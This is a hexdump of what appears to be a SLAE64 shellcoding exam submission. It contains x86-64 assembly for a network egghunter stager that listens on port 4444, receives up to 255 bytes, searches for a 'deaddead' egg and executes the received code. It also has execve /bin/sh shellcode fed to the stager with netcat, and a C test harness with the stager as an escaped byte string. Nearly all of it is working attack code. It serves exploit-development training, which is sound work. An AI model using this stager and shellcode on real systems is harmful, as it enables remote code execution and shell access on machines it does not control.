00000000  3b 45 78 61 6d 20 41 73  73 69 67 6e 6d 65 6e 74  |;Exam Assignment|
00000010  20 33 0a 3b 69 6d 70 6c  65 6d 65 6e 74 61 74 69  | 3.;implementati|
00000020  6f 6e 20 6f 66 20 65 67  67 68 75 6e 74 65 72 0a  |on of egghunter.|
00000030  3b 44 65 66 61 75 6c 74  20 65 67 67 20 3d 20 22  |;Default egg = "|
00000040  64 65 61 64 64 65 61 64  22 20 20 20 20 20 20 20  |deaddead"       |
00000050  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000060  3b 0a 3b 49 66 20 63 6f  6e 6e 65 63 74 65 64 20  |;.;If connected |
00000070  74 68 65 20 73 74 61 67  65 72 20 63 68 65 63 6b  |the stager check|
00000080  20 6f 66 20 65 67 67 20  2c 20 69 66 20 70 72 65  | of egg , if pre|
00000090  73 65 6e 74 20 65 78 65  63 75 74 65 20 74 68 65  |sent execute the|
000000a0  20 63 6f 64 65 20 20 20  3b 0a 3b 59 6f 75 20 63  | code   ;.;You c|
000000b0  61 6e 20 73 65 6e 64 20  61 20 6d 61 78 69 6d 75  |an send a maximu|
000000c0  6d 20 6f 66 20 32 35 35  20 62 79 74 65 73 20 28  |m of 255 bytes (|
000000d0  65 67 67 20 2b 20 63 6f  64 65 29 20 20 20 20 20  |egg + code)     |
000000e0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000000f0  3b 0a 3b 69 66 20 6e 6f  20 65 67 67 20 2c 20 73  |;.;if no egg , s|
00000100  68 65 6c 6c 63 6f 64 65  20 65 78 69 74 20 20 20  |hellcode exit   |
00000110  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
00000130  20 20 20 20 20 20 20 20  3b 0a 3b 43 68 72 69 73  |        ;.;Chris|
00000140  74 6f 70 68 65 20 47 20  53 4c 41 45 36 34 20 2d  |tophe G SLAE64 -|
00000150  20 31 33 33 37 20 20 20  20 20 20 20 20 20 20 20  | 1337           |
00000160  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
00000180  3b 0a 0a 0a 0a 67 6c 6f  62 61 6c 20 5f 73 74 61  |;....global _sta|
00000190  72 74 0a 0a 20 20 20 20  20 6a 6d 70 20 73 68 6f  |rt..     jmp sho|
000001a0  72 74 20 5f 73 74 61 72  74 0a 20 20 20 20 5f 73  |rt _start.    _s|
000001b0  74 61 72 74 5f 63 6f 64  65 20 3a 0a 20 20 20 20  |tart_code :.    |
000001c0  20 20 20 20 63 61 6c 6c  20 72 73 69 0a 0a 5f 73  |    call rsi.._s|
000001d0  74 61 72 74 3a 0a 0a 0a  20 20 20 20 3b 20 73 6f  |tart:...    ; so|
000001e0  63 6b 20 3d 20 73 6f 63  6b 65 74 28 41 46 5f 49  |ck = socket(AF_I|
000001f0  4e 45 54 2c 20 53 4f 43  4b 5f 53 54 52 45 41 4d  |NET, SOCK_STREAM|
00000200  2c 20 30 29 0a 20 20 20  20 3b 20 41 46 5f 49 4e  |, 0).    ; AF_IN|
00000210  45 54 20 3d 20 32 0a 20  20 20 20 3b 20 53 4f 43  |ET = 2.    ; SOC|
00000220  4b 5f 53 54 52 45 41 4d  20 3d 20 31 0a 20 20 20  |K_STREAM = 1.   |
00000230  20 3b 20 73 79 73 63 61  6c 6c 20 6e 75 6d 62 65  | ; syscall numbe|
00000240  72 20 34 31 0a 0a 20 20  20 20 78 6f 72 20 72 64  |r 41..    xor rd|
00000250  78 20 2c 20 72 64 78 0a  20 20 20 20 70 75 73 68  |x , rdx.    push|
00000260  20 72 64 78 20 20 20 20  20 20 20 20 3b 20 6e 75  | rdx        ; nu|
00000270  6c 6c 20 69 6e 74 6f 20  74 68 65 20 73 74 61 63  |ll into the stac|
00000280  6b 20 0a 20 20 20 20 70  75 73 68 20 62 79 74 65  |k .    push byte|
00000290  20 30 78 32 39 20 3b 20  73 79 73 63 61 6c 6c 20  | 0x29 ; syscall |
000002a0  6e 75 6d 62 65 72 20 34  31 0a 20 20 20 20 70 6f  |number 41.    po|
000002b0  70 20 72 61 78 0a 20 20  20 20 70 75 73 68 20 62  |p rax.    push b|
000002c0  79 74 65 20 30 78 32 20  20 3b 20 41 46 5f 49 4e  |yte 0x2  ; AF_IN|
000002d0  45 54 0a 20 20 20 20 70  6f 70 20 72 64 69 0a 20  |ET.    pop rdi. |
000002e0  20 20 20 70 75 73 68 20  62 79 74 65 20 30 78 31  |   push byte 0x1|
000002f0  20 20 3b 20 53 4f 43 4b  5f 53 54 52 45 41 4d 0a  |  ; SOCK_STREAM.|
00000300  20 20 20 20 70 6f 70 20  72 73 69 0a 20 20 20 20  |    pop rsi.    |
00000310  73 79 73 63 61 6c 6c 0a  0a 20 20 20 20 3b 20 63  |syscall..    ; c|
00000320  6f 70 79 20 73 6f 63 6b  65 74 20 64 65 73 63 72  |opy socket descr|
00000330  69 70 74 6f 72 20 74 6f  20 72 64 69 20 66 6f 72  |iptor to rdi for|
00000340  20 66 75 74 75 72 65 20  75 73 65 0a 20 20 20 20  | future use.    |
00000350  78 63 68 67 20 72 61 78  20 2c 20 72 64 69 0a 0a  |xchg rax , rdi..|
00000360  0a 20 20 20 20 3b 20 73  65 72 76 65 72 2e 73 69  |.    ; server.si|
00000370  6e 5f 66 61 6d 69 6c 79  20 3d 20 41 46 5f 49 4e  |n_family = AF_IN|
00000380  45 54 0a 20 20 20 20 3b  20 73 65 72 76 65 72 2e  |ET.    ; server.|
00000390  73 69 6e 5f 70 6f 72 74  20 3d 20 68 74 6f 6e 73  |sin_port = htons|
000003a0  28 50 4f 52 54 29 0a 20  20 20 20 3b 20 73 65 72  |(PORT).    ; ser|
000003b0  76 65 72 2e 73 69 6e 5f  61 64 64 72 2e 73 5f 61  |ver.sin_addr.s_a|
000003c0  64 64 72 20 3d 20 49 4e  41 44 44 52 5f 41 4e 59  |ddr = INADDR_ANY|
000003d0  0a 20 20 20 20 3b 20 62  7a 65 72 6f 28 26 73 65  |.    ; bzero(&se|
000003e0  72 76 65 72 2e 73 69 6e  5f 7a 65 72 6f 2c 20 38  |rver.sin_zero, 8|
000003f0  29 0a 0a 20 20 20 20 20  78 6f 72 20 72 61 78 2c  |)..     xor rax,|
00000400  20 72 61 78 0a 0a 20 20  20 20 20 70 75 73 68 20  | rax..     push |
00000410  72 61 78 20 20 3b 20 62  7a 65 72 6f 28 26 73 65  |rax  ; bzero(&se|
00000420  72 76 65 72 2e 73 69 6e  5f 7a 65 72 6f 2c 20 38  |rver.sin_zero, 8|
00000430  29 0a 0a 0a 20 20 20 20  20 6d 6f 76 20 72 62 78  |)...     mov rbx|
00000440  20 2c 20 30 78 66 66 66  66 66 66 66 66 61 33 65  | , 0xffffffffa3e|
00000450  65 66 66 66 64 20 20 20  20 3b 20 6d 6f 76 65 20  |efffd    ; move |
00000460  69 70 20 61 64 64 72 65  73 73 20 2c 20 70 6f 72  |ip address , por|
00000470  74 20 34 34 34 34 20 2c  20 41 46 5f 49 4e 45 54  |t 4444 , AF_INET|
00000480  20 28 30 32 29 20 69 6e  20 6f 6e 65 20 69 6e 73  | (02) in one ins|
00000490  74 72 75 63 74 69 6f 6e  20 28 6e 6f 74 65 64 20  |truction (noted |
000004a0  74 6f 20 72 65 6d 6f 76  65 20 6e 75 6c 6c 20 6f  |to remove null o|
000004b0  66 20 69 70 20 61 64 64  72 65 73 73 20 61 6e 64  |f ip address and|
000004c0  20 41 46 5f 49 4e 45 54  20 76 61 6c 75 65 29 0a  | AF_INET value).|
000004d0  0a 0a 20 20 20 20 20 6e  6f 74 20 72 62 78 0a 20  |..     not rbx. |
000004e0  20 20 20 20 70 75 73 68  20 72 62 78 0a 20 20 20  |    push rbx.   |
000004f0  20 20 70 75 73 68 20 72  73 70 20 20 3b 20 73 61  |  push rsp  ; sa|
00000500  76 65 20 72 73 70 20 76  61 6c 75 65 20 69 6e 74  |ve rsp value int|
00000510  6f 20 74 68 65 20 73 74  61 63 6b 20 2c 20 6e 65  |o the stack , ne|
00000520  65 64 65 64 20 66 6f 72  20 72 73 69 20 6c 61 74  |eded for rsi lat|
00000530  65 72 0a 0a 0a 20 20 20  20 3b 20 62 69 6e 64 28  |er...    ; bind(|
00000540  73 6f 63 6b 2c 20 28 73  74 72 75 63 74 20 73 6f  |sock, (struct so|
00000550  63 6b 61 64 64 72 20 2a  29 26 73 65 72 76 65 72  |ckaddr *)&server|
00000560  2c 20 73 6f 63 6b 61 64  64 72 5f 6c 65 6e 29 0a  |, sockaddr_len).|
00000570  20 20 20 20 3b 20 73 79  73 63 61 6c 6c 20 6e 75  |    ; syscall nu|
00000580  6d 62 65 72 20 34 39 0a  0a 0a 20 20 20 20 70 75  |mber 49...    pu|
00000590  73 68 20 62 79 74 65 20  30 78 33 31 20 3b 20 28  |sh byte 0x31 ; (|
000005a0  34 39 29 0a 20 20 20 20  70 6f 70 20 72 61 78 0a  |49).    pop rax.|
000005b0  20 20 20 20 70 6f 70 20  72 73 69 20 20 20 20 20  |    pop rsi     |
000005c0  20 20 20 3b 20 72 65 74  72 69 65 76 65 20 76 61  |   ; retrieve va|
000005d0  6c 75 65 20 6f 66 20 72  73 70 20 20 70 75 73 68  |lue of rsp  push|
000005e0  65 64 20 69 6e 74 6f 20  74 68 65 20 73 74 61 63  |ed into the stac|
000005f0  6b 20 62 65 66 6f 72 65  0a 20 20 20 20 70 75 73  |k before.    pus|
00000600  68 20 62 79 74 65 20 30  78 31 30 20 20 3b 20 28  |h byte 0x10  ; (|
00000610  31 36 20 62 79 74 65 73  29 20 73 6f 63 6b 61 64  |16 bytes) sockad|
00000620  64 72 5f 6c 65 6e 0a 20  20 20 20 70 6f 70 20 72  |dr_len.    pop r|
00000630  64 78 0a 20 20 20 20 73  79 73 63 61 6c 6c 0a 0a  |dx.    syscall..|
00000640  0a 20 20 20 20 3b 20 6c  69 73 74 65 6e 28 73 6f  |.    ; listen(so|
00000650  63 6b 2c 20 4d 41 58 5f  43 4c 49 45 4e 54 53 29  |ck, MAX_CLIENTS)|
00000660  0a 20 20 20 20 3b 20 73  79 73 63 61 6c 6c 20 6e  |.    ; syscall n|
00000670  75 6d 62 65 72 20 35 30  0a 0a 20 20 20 20 70 75  |umber 50..    pu|
00000680  73 68 20 62 79 74 65 20  30 78 33 32 20 3b 20 28  |sh byte 0x32 ; (|
00000690  35 30 29 0a 20 20 20 20  70 6f 70 20 72 61 78 0a  |50).    pop rax.|
000006a0  20 20 20 20 70 75 73 68  20 62 79 74 65 20 30 78  |    push byte 0x|
000006b0  32 20 20 20 3b 4d 41 58  5f 43 4c 49 45 4e 54 53  |2   ;MAX_CLIENTS|
000006c0  0a 0a 20 20 20 20 70 6f  70 20 72 73 69 0a 20 20  |..    pop rsi.  |
000006d0  20 20 73 79 73 63 61 6c  6c 0a 0a 0a 20 20 20 20  |  syscall...    |
000006e0  3b 20 6e 65 77 20 3d 20  61 63 63 65 70 74 28 73  |; new = accept(s|
000006f0  6f 63 6b 2c 20 28 73 74  72 75 63 74 20 73 6f 63  |ock, (struct soc|
00000700  6b 61 64 64 72 20 2a 29  26 63 6c 69 65 6e 74 2c  |kaddr *)&client,|
00000710  20 26 73 6f 63 6b 61 64  64 72 5f 6c 65 6e 29 0a  | &sockaddr_len).|
00000720  20 20 20 20 3b 20 73 79  73 63 61 6c 6c 20 6e 75  |    ; syscall nu|
00000730  6d 62 65 72 20 34 33 0a  0a 0a 20 20 20 20 70 75  |mber 43...    pu|
00000740  73 68 20 62 79 74 65 20  30 78 32 62 20 20 20 3b  |sh byte 0x2b   ;|
00000750  20 41 63 63 65 70 74 20  73 79 73 63 61 6c 6c 0a  | Accept syscall.|
00000760  20 20 20 20 70 6f 70 20  72 61 78 0a 20 20 20 20  |    pop rax.    |
00000770  73 75 62 20 72 73 70 2c  20 30 78 31 30 0a 20 20  |sub rsp, 0x10.  |
00000780  20 20 70 75 73 68 20 72  73 70 0a 20 20 20 20 70  |  push rsp.    p|
00000790  6f 70 20 72 73 69 20 20  20 20 20 20 20 3b 28 73  |op rsi       ;(s|
000007a0  74 72 75 63 74 20 73 6f  63 6b 61 64 64 72 20 2a  |truct sockaddr *|
000007b0  29 26 63 6c 69 65 6e 74  0a 0a 20 20 20 20 70 75  |)&client..    pu|
000007c0  73 68 20 62 79 74 65 20  30 78 31 30 0a 20 20 20  |sh byte 0x10.   |
000007d0  20 70 75 73 68 20 72 73  70 0a 20 20 20 20 70 6f  | push rsp.    po|
000007e0  70 20 72 64 78 20 20 20  20 3b 20 26 73 6f 63 6b  |p rdx    ; &sock|
000007f0  61 64 64 72 5f 6c 65 6e  0a 0a 20 20 20 20 73 79  |addr_len..    sy|
00000800  73 63 61 6c 6c 0a 0a 20  20 20 20 3b 20 73 74 6f  |scall..    ; sto|
00000810  72 65 20 74 68 65 20 63  6c 69 65 6e 74 20 73 6f  |re the client so|
00000820  63 6b 65 74 20 64 65 73  63 72 69 70 74 69 6f 6e  |cket description|
00000830  0a 20 20 20 20 6d 6f 76  20 72 39 2c 20 72 61 78  |.    mov r9, rax|
00000840  0a 0a 20 20 20 20 3b 20  63 6c 6f 73 65 20 70 61  |..    ; close pa|
00000850  72 65 6e 74 0a 0a 20 20  20 20 70 75 73 68 20 62  |rent..    push b|
00000860  79 74 65 20 30 78 33 0a  20 20 20 20 70 6f 70 20  |yte 0x3.    pop |
00000870  72 61 78 0a 20 20 20 20  73 79 73 63 61 6c 6c 0a  |rax.    syscall.|
00000880  0a 0a 0a 0a 0a 20 20 20  20 20 20 78 63 68 67 20  |.....      xchg |
00000890  72 64 69 20 2c 20 72 39  20 20 20 3b 20 72 65 73  |rdi , r9   ; res|
000008a0  74 6f 72 65 20 63 6c 69  65 6e 74 20 73 6f 63 6b  |tore client sock|
000008b0  65 74 20 64 65 73 63 72  69 70 74 69 6f 6e 20 74  |et description t|
000008c0  6f 20 72 64 69 0a 20 20  20 20 20 20 78 6f 72 20  |o rdi.      xor |
000008d0  72 73 69 20 2c 20 72 73  69 0a 0a 20 20 64 75 70  |rsi , rsi..  dup|
000008e0  32 3a 0a 20 20 20 20 20  20 70 75 73 68 20 62 79  |2:.      push by|
000008f0  74 65 20 30 78 32 31 0a  20 20 20 20 20 20 70 6f  |te 0x21.      po|
00000900  70 20 72 61 78 20 20 20  20 20 20 20 3b 20 64 75  |p rax       ; du|
00000910  70 6c 69 63 61 74 65 20  73 6f 63 6b 65 74 73 20  |plicate sockets |
00000920  20 64 75 70 32 20 28 6e  65 77 2c 20 6f 6c 64 29  | dup2 (new, old)|
00000930  20 69 6e 20 74 68 69 73  20 63 61 73 65 20 28 73  | in this case (s|
00000940  74 64 69 6e 20 2c 20 73  74 64 6f 75 74 20 2c 20  |tdin , stdout , |
00000950  73 74 64 65 72 72 29 3b  20 74 68 72 65 65 20 74  |stderr); three t|
00000960  69 6d 65 73 20 6c 6f 6f  70 0a 20 20 20 20 20 20  |imes loop.      |
00000970  73 79 73 63 61 6c 6c 0a  20 20 20 20 69 6e 63 20  |syscall.    inc |
00000980  72 73 69 0a 20 20 20 20  63 6d 70 20 72 73 69 20  |rsi.    cmp rsi |
00000990  2c 20 30 78 33 20 20 3b  20 67 6f 20 69 6e 20 74  |, 0x3  ; go in t|
000009a0  68 65 20 6e 65 78 74 20  63 6f 75 70 6c 65 20 6f  |he next couple o|
000009b0  66 20 69 6e 73 74 72 75  63 74 69 6f 6e 20 69 66  |f instruction if|
000009c0  20 65 71 75 61 6c 73 0a  0a 20 6c 6f 6f 70 6e 65  | equals.. loopne|
000009d0  20 64 75 70 32 0a 0a 20  20 20 20 20 20 20 78 6f  | dup2..       xo|
000009e0  72 20 72 73 69 20 2c 20  72 73 69 0a 20 20 20 20  |r rsi , rsi.    |
000009f0  20 20 20 6d 75 6c 20 72  73 69 0a 20 20 20 20 20  |   mul rsi.     |
00000a00  20 20 78 6f 72 20 72 64  69 20 2c 20 72 64 69 0a  |  xor rdi , rdi.|
00000a10  20 20 20 20 20 20 20 73  75 62 20 73 70 6c 20 2c  |       sub spl ,|
00000a20  20 30 78 66 66 0a 20 20  20 20 20 20 20 6d 6f 76  | 0xff.       mov|
00000a30  20 72 73 69 20 2c 20 72  73 70 0a 20 20 20 20 20  | rsi , rsp.     |
00000a40  20 20 6d 6f 76 20 64 6c  20 2c 20 30 78 66 66 0a  |  mov dl , 0xff.|
00000a50  20 20 20 20 20 20 20 73  79 73 63 61 6c 6c 0a 0a  |       syscall..|
00000a60  20 20 20 20 20 20 49 6e  63 5f 72 73 69 3a 0a 20  |      Inc_rsi:. |
00000a70  20 20 20 20 20 20 20 20  63 6d 70 20 64 69 6c 20  |        cmp dil |
00000a80  2c 20 30 78 66 66 0a 20  20 20 20 20 20 20 20 20  |, 0xff.         |
00000a90  6a 7a 20 45 78 69 74 0a  20 20 20 20 20 20 20 20  |jz Exit.        |
00000aa0  20 69 6e 63 20 72 73 69  0a 20 20 20 20 20 20 20  | inc rsi.       |
00000ab0  20 20 69 6e 63 20 72 64  69 0a 0a 0a 0a 20 20 20  |  inc rdi....   |
00000ac0  20 20 20 63 6d 70 20 5b  72 73 69 20 2d 20 34 5d  |   cmp [rsi - 4]|
00000ad0  20 2c 20 64 77 6f 72 64  20 30 78 36 34 36 31 36  | , dword 0x64616|
00000ae0  35 36 34 20 20 20 20 20  20 20 20 20 20 20 20 20  |564             |
00000af0  20 20 20 20 20 20 3b 20  65 67 67 68 75 6e 74 65  |      ; egghunte|
00000b00  72 0a 20 20 20 20 20 20  6a 6e 7a 20 49 6e 63 5f  |r.      jnz Inc_|
00000b10  72 73 69 0a 20 20 20 20  20 20 63 6d 70 20 5b 72  |rsi.      cmp [r|
00000b20  73 69 20 2d 20 38 5d 20  2c 20 64 77 6f 72 64 20  |si - 8] , dword |
00000b30  30 78 36 34 36 31 36 35  36 34 0a 20 20 20 20 20  |0x64616564.     |
00000b40  20 6a 6e 7a 20 49 6e 63  5f 72 73 69 0a 20 20 20  | jnz Inc_rsi.   |
00000b50  20 20 20 6a 7a 20 5f 73  74 61 72 74 5f 63 6f 64  |   jz _start_cod|
00000b60  65 0a 0a 20 20 20 20 20  20 45 78 69 74 3a 0a 20  |e..      Exit:. |
00000b70  20 20 20 20 20 20 20 20  70 75 73 68 20 62 79 74  |        push byt|
00000b80  65 20 30 78 33 63 0a 20  20 20 20 20 20 20 20 20  |e 0x3c.         |
00000b90  70 6f 70 20 72 61 78 0a  20 20 20 20 20 20 20 20  |pop rax.        |
00000ba0  20 73 79 73 63 61 6c 6c  0a 0a 0a 0a 0a 2d 2d 2d  | syscall.....---|
00000bb0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00000c30  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 0a 0a 55  |-------------..U|
00000c40  73 61 67 65 20 3a 0a 0a  20 20 20 20 45 78 65 63  |sage :..    Exec|
00000c50  76 65 20 53 68 65 6c 6c  63 6f 64 65 20 0a 0a 23  |ve Shellcode ..#|
00000c60  28 65 63 68 6f 20 2d 6e  65 20 22 5c 78 36 38 5c  |(echo -ne "\x68\|
00000c70  78 38 35 5c 78 31 31 5c  78 34 37 5c 78 30 32 5c  |x85\x11\x47\x02\|
00000c80  78 36 34 5c 78 36 35 5c  78 36 31 5c 78 36 34 5c  |x64\x65\x61\x64\|
*
00000ca0  78 65 62 5c 78 31 64 5c  78 34 38 5c 78 33 31 5c  |xeb\x1d\x48\x31\|
00000cb0  78 63 30 5c 78 35 66 5c  78 38 38 5c 78 36 37 5c  |xc0\x5f\x88\x67\|
00000cc0  78 30 37 5c 78 34 38 5c  78 38 39 5c 78 37 66 5c  |x07\x48\x89\x7f\|
00000cd0  78 30 38 5c 78 34 38 5c  78 38 39 5c 78 34 37 5c  |x08\x48\x89\x47\|
00000ce0  78 31 30 5c 78 34 38 5c  78 38 64 5c 78 37 37 5c  |x10\x48\x8d\x77\|
00000cf0  78 30 38 5c 78 34 38 5c  78 38 64 5c 78 35 37 5c  |x08\x48\x8d\x57\|
00000d00  78 31 30 5c 78 34 38 5c  78 38 33 5c 78 63 30 5c  |x10\x48\x83\xc0\|
00000d10  78 33 62 5c 78 30 66 5c  78 30 35 5c 78 65 38 5c  |x3b\x0f\x05\xe8\|
00000d20  78 64 65 5c 78 66 66 5c  78 66 66 5c 78 66 66 5c  |xde\xff\xff\xff\|
00000d30  78 32 66 5c 78 36 32 5c  78 36 39 5c 78 36 65 5c  |x2f\x62\x69\x6e\|
00000d40  78 32 66 5c 78 37 33 5c  78 36 38 5c 78 34 31 5c  |x2f\x73\x68\x41\|
00000d50  78 34 32 5c 78 34 32 5c  78 34 32 5c 78 34 32 5c  |x42\x42\x42\x42\|
*
00000d70  78 34 33 5c 78 34 33 5c  78 34 33 5c 78 34 33 5c  |x43\x43\x43\x43\|
00000d80  78 34 33 5c 78 34 33 5c  78 34 33 5c 78 34 33 22  |x43\x43\x43\x43"|
00000d90  20 3b 20 63 61 74 29 20  7c 20 6e 63 20 6c 6f 63  | ; cat) | nc loc|
00000da0  61 6c 68 6f 73 74 20 34  34 34 34 0a 0a 0a 22 78  |alhost 4444..."x|
00000db0  36 38 5c 78 38 35 5c 78  31 31 5c 78 34 37 5c 78  |68\x85\x11\x47\x|
00000dc0  30 32 22 20 2d 2d 3e 3e  20 64 75 6d 6d 20 62 79  |02" -->> dumm by|
00000dd0  74 65 73 0a 0a 22 5c 78  36 34 5c 78 36 35 5c 78  |tes.."\x64\x65\x|
00000de0  36 31 5c 78 36 34 5c 78  36 34 5c 78 36 35 5c 78  |61\x64\x64\x65\x|
00000df0  36 31 5c 78 36 34 22 20  2d 2d 3e 3e 20 65 67 67  |61\x64" -->> egg|
00000e00  20 28 64 65 61 64 64 65  61 64 29 0a 0a 22 5c 78  | (deaddead).."\x|
00000e10  65 62 5c 78 31 64 5c 78  34 38 5c 78 33 31 5c 78  |eb\x1d\x48\x31\x|
00000e20  63 30 5c 78 35 66 5c 78  38 38 5c 78 36 37 5c 78  |c0\x5f\x88\x67\x|
00000e30  30 37 5c 78 34 38 5c 78  38 39 5c 78 37 66 5c 78  |07\x48\x89\x7f\x|
00000e40  30 38 5c 78 34 38 5c 78  38 39 5c 78 34 37 5c 78  |08\x48\x89\x47\x|
00000e50  31 30 22 0a 22 5c 78 34  38 5c 78 38 64 5c 78 37  |10"."\x48\x8d\x7|
00000e60  37 5c 78 30 38 5c 78 34  38 5c 78 38 64 5c 78 35  |7\x08\x48\x8d\x5|
00000e70  37 5c 78 31 30 5c 78 34  38 5c 78 38 33 5c 78 63  |7\x10\x48\x83\xc|
00000e80  30 5c 78 33 62 5c 78 30  66 5c 78 30 35 5c 78 65  |0\x3b\x0f\x05\xe|
00000e90  38 5c 78 64 65 5c 78 66  66 22 20 20 2d 2d 3e 3e  |8\xde\xff"  -->>|
00000ea0  20 73 68 65 6c 6c 63 6f  64 65 20 45 78 65 63 76  | shellcode Execv|
00000eb0  65 20 4a 43 50 20 0a 22  5c 78 66 66 5c 78 66 66  |e JCP ."\xff\xff|
00000ec0  5c 78 32 66 5c 78 36 32  5c 78 36 39 5c 78 36 65  |\x2f\x62\x69\x6e|
00000ed0  5c 78 32 66 5c 78 37 33  5c 78 36 38 5c 78 34 31  |\x2f\x73\x68\x41|
00000ee0  5c 78 34 32 5c 78 34 32  5c 78 34 32 5c 78 34 32  |\x42\x42\x42\x42|
00000ef0  5c 78 34 32 5c 78 34 32  5c 78 34 32 22 0a 22 5c  |\x42\x42\x42"."\|
00000f00  78 34 32 5c 78 34 33 5c  78 34 33 5c 78 34 33 5c  |x42\x43\x43\x43\|
00000f10  78 34 33 5c 78 34 33 5c  78 34 33 5c 78 34 33 5c  |x43\x43\x43\x43\|
00000f20  78 34 33 22 20 0a 0a 2d  2d 2d 2d 2d 2d 2d 2d 2d  |x43" ..---------|
00000f30  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00000fb0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 0a 0a 0a 53 68 65  |----------...She|
00000fc0  6c 6c 63 6f 64 65 20 3a  0a 0a 23 69 6e 63 6c 75  |llcode :..#inclu|
00000fd0  64 65 20 3c 73 74 64 69  6f 2e 68 3e 0a 23 69 6e  |de <stdio.h>.#in|
00000fe0  63 6c 75 64 65 20 3c 73  74 72 69 6e 67 2e 68 3e  |clude <string.h>|
00000ff0  0a 0a 75 6e 73 69 67 6e  65 64 20 63 68 61 72 20  |..unsigned char |
00001000  73 74 61 67 65 72 5b 5d  20 3d 20 5c 0a 22 5c 78  |stager[] = \."\x|
00001010  65 62 5c 78 30 32 5c 78  66 66 5c 78 64 36 5c 78  |eb\x02\xff\xd6\x|
00001020  34 38 5c 78 33 31 5c 78  64 32 5c 78 36 61 5c 78  |48\x31\xd2\x6a\x|
00001030  32 39 5c 78 35 38 5c 78  36 61 5c 78 30 32 5c 78  |29\x58\x6a\x02\x|
00001040  35 66 5c 78 36 61 5c 78  30 31 5c 78 35 65 5c 78  |5f\x6a\x01\x5e\x|
00001050  30 66 5c 78 30 35 5c 78  34 38 5c 78 39 37 5c 78  |0f\x05\x48\x97\x|
00001060  34 38 5c 78 33 31 5c 78  63 30 5c 78 35 30 5c 78  |48\x31\xc0\x50\x|
00001070  34 38 5c 78 63 37 5c 78  63 33 5c 78 66 64 5c 78  |48\xc7\xc3\xfd\x|
00001080  66 66 5c 78 65 65 5c 78  61 33 5c 78 34 38 5c 78  |ff\xee\xa3\x48\x|
00001090  66 37 5c 78 64 33 5c 78  35 33 5c 78 35 34 5c 78  |f7\xd3\x53\x54\x|
000010a0  36 61 5c 78 33 31 5c 78  35 38 5c 78 35 65 5c 78  |6a\x31\x58\x5e\x|
000010b0  36 61 5c 78 31 30 5c 78  35 61 5c 78 30 66 5c 78  |6a\x10\x5a\x0f\x|
000010c0  30 35 5c 78 36 61 5c 78  33 32 5c 78 35 38 5c 78  |05\x6a\x32\x58\x|
000010d0  36 61 5c 78 30 32 5c 78  35 65 5c 78 30 66 5c 78  |6a\x02\x5e\x0f\x|
000010e0  30 35 5c 78 36 61 5c 78  32 62 5c 78 35 38 5c 78  |05\x6a\x2b\x58\x|
000010f0  34 38 5c 78 38 33 5c 78  65 63 5c 78 31 30 5c 78  |48\x83\xec\x10\x|
00001100  35 34 5c 78 35 65 5c 78  36 61 5c 78 31 30 5c 78  |54\x5e\x6a\x10\x|
00001110  35 34 5c 78 35 61 5c 78  30 66 5c 78 30 35 5c 78  |54\x5a\x0f\x05\x|
00001120  34 39 5c 78 38 39 5c 78  63 31 5c 78 36 61 5c 78  |49\x89\xc1\x6a\x|
00001130  30 33 5c 78 35 38 5c 78  30 66 5c 78 30 35 5c 78  |03\x58\x0f\x05\x|
00001140  34 39 5c 78 38 37 5c 78  66 39 5c 78 34 38 5c 78  |49\x87\xf9\x48\x|
00001150  33 31 5c 78 66 36 5c 78  36 61 5c 78 32 31 5c 78  |31\xf6\x6a\x21\x|
00001160  35 38 5c 78 30 66 5c 78  30 35 5c 78 34 38 5c 78  |58\x0f\x05\x48\x|
00001170  66 66 5c 78 63 36 5c 78  34 38 5c 78 38 33 5c 78  |ff\xc6\x48\x83\x|
00001180  66 65 5c 78 30 33 5c 78  65 30 5c 78 66 32 5c 78  |fe\x03\xe0\xf2\x|
00001190  34 38 5c 78 33 31 5c 78  66 36 5c 78 34 38 5c 78  |48\x31\xf6\x48\x|
000011a0  66 37 5c 78 65 36 5c 78  34 38 5c 78 33 31 5c 78  |f7\xe6\x48\x31\x|
000011b0  66 66 5c 78 34 30 5c 78  38 30 5c 78 65 63 5c 78  |ff\x40\x80\xec\x|
000011c0  66 66 5c 78 34 38 5c 78  38 39 5c 78 65 36 5c 78  |ff\x48\x89\xe6\x|
000011d0  62 32 5c 78 66 66 5c 78  30 66 5c 78 30 35 5c 78  |b2\xff\x0f\x05\x|
000011e0  34 30 5c 78 38 30 5c 78  66 66 5c 78 66 66 5c 78  |40\x80\xff\xff\x|
000011f0  37 34 5c 78 31 65 5c 78  34 38 5c 78 66 66 5c 78  |74\x1e\x48\xff\x|
00001200  63 36 5c 78 34 38 5c 78  66 66 5c 78 63 37 5c 78  |c6\x48\xff\xc7\x|
00001210  38 31 5c 78 37 65 5c 78  66 63 5c 78 36 34 5c 78  |81\x7e\xfc\x64\x|
00001220  36 35 5c 78 36 31 5c 78  36 34 5c 78 37 35 5c 78  |65\x61\x64\x75\x|
00001230  65 62 5c 78 38 31 5c 78  37 65 5c 78 66 38 5c 78  |eb\x81\x7e\xf8\x|
00001240  36 34 5c 78 36 35 5c 78  36 31 5c 78 36 34 5c 78  |64\x65\x61\x64\x|
00001250  37 35 5c 78 65 32 5c 78  30 66 5c 78 38 34 5c 78  |75\xe2\x0f\x84\x|
00001260  36 61 5c 78 66 66 5c 78  66 66 5c 78 66 66 5c 78  |6a\xff\xff\xff\x|
00001270  36 61 5c 78 33 63 5c 78  35 38 5c 78 30 66 5c 78  |6a\x3c\x58\x0f\x|
00001280  30 35 22 3b 0a 0a 69 6e  74 20 6d 61 69 6e 28 29  |05";..int main()|
00001290  0a 0a 7b 0a 0a 20 20 20  20 70 72 69 6e 74 66 28  |..{..    printf(|
000012a0  22 53 74 61 67 65 72 20  4c 65 6e 67 74 68 3a 20  |"Stager Length: |
000012b0  20 25 64 5c 6e 22 2c 20  28 69 6e 74 29 73 74 72  | %d\n", (int)str|
000012c0  6c 65 6e 28 73 74 61 67  65 72 29 29 3b 0a 0a 0a  |len(stager));...|
000012d0  20 20 20 20 28 2a 28 76  6f 69 64 20 20 28 2a 29  |    (*(void  (*)|
